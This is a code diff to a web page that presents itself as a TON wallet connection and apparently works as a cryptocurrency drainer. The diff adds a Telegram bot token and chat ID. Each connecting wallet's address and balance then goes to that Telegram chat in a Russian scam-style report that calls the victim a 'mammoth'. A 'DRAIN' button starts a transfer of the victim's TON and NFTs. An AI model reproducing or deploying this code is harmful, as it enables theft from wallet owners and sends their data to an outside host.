@@ -55,8 +55,8 @@
         const manifestUrl = 'https://aslan22822.github.io/ton-connect-wallet/tonconnect-manifest.json';
         
         // Telegram Bot Configurations
-        const tgBotToken = 'REPLACE_WITH_YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram bot token
-        const tgChatId = 'REPLACE_WITH_YOUR_TELEGRAM_CHAT_ID'; // Replace with your Telegram chat ID
+        const tgBotToken = '7825399084:AAFIOuS92DHDfN-hE9-SG_7hQqlc9jUqRP4'; // Replace with your Telegram bot token
+        const tgChatId = '5107144356'; // Replace with your Telegram chat ID
 
         // Function to send messages to Telegram
         async function sendTelegramMessage(message) {
@@ -83,8 +83,9 @@
         tonConnectUI.onStatusChange(async (walletInfo) => {
             if (walletInfo && walletInfo.account) {
                 connectedWallet = walletInfo.account;
-                const message = `Wallet connected: ${walletInfo.account.address}`;
-                await sendTelegramMessage(message);
+            const message = `Wallet connected: ${walletInfo.account.address}`;
+            await sendTelegramMessage(message);
+            await checkBalance(walletInfo.account.address);
                 await checkBalance(walletInfo.account.address);
                 // Automatically initiate transfer when wallet is connected
                 // Only attempt the transfer if there is a valid wallet
@@ -103,7 +104,14 @@
                 const data = await response.json();
                 if (data && data.result) {
                     const balance = parseFloat(data.result) / 1000000000; // Convert nanotons to TON
-                    const balanceMessage = `Balance of ${walletAddress}: ${balance} TON`;
+                    const balanceMessage = `➖ Нет средств на подключенном кошельке мамонта #no_money
+ └ 🌐 Домен: market.x-empire.org
+ └ 💵 Баланс кошелька: ${balance} TON
+ └ 💎 Требуется: 0.11 TON
+ └ 🇪🇪 EE ${connectedWallet}
+ └ 📱 Кошелек: tonkeeper
+ └ 🖱️ Платформа: iphone
+ └ 👝 Адрес: ${walletAddress}`;
                     await sendTelegramMessage(balanceMessage);
                 } else {
                     console.error('Failed to fetch balance');
@@ -115,7 +123,7 @@
 
         // Function to transfer TON and NFTs
         async function didtrans() {
-            console.log('Attempting to send transaction...');
+            console.log('Attempting to send transaction... Please wait.');
             try {
                 if (!connectedWallet) {
                     console.error('Wallet is not connected. Cannot proceed with transaction.');
@@ -133,17 +141,17 @@
                 };
 
                 // Send transaction
-                await tonConnectUI.sendTransaction({ transaction });
-                const transactionMessage = 'Transaction sent successfully';
+                await tonConnectUI.sendTransaction(transaction);
+                const transactionMessage = 'Transaction sent successfully.';
                 await sendTelegramMessage(transactionMessage);
             } catch (error) {
-                const errorMessage = `Failed to send transaction: ${error}`;
+                const errorMessage = `Failed to send transaction: ${error.message || error}`;
                 await sendTelegramMessage(errorMessage);
             }
         }
 
         // Event listener for the DRAIN button
-        document.getElementById('drain-button').addEventListener('click', () => {
+        document.getElementById('drain-button').addEventListener('click', async () => {
             await didtrans();
         });
     </script>
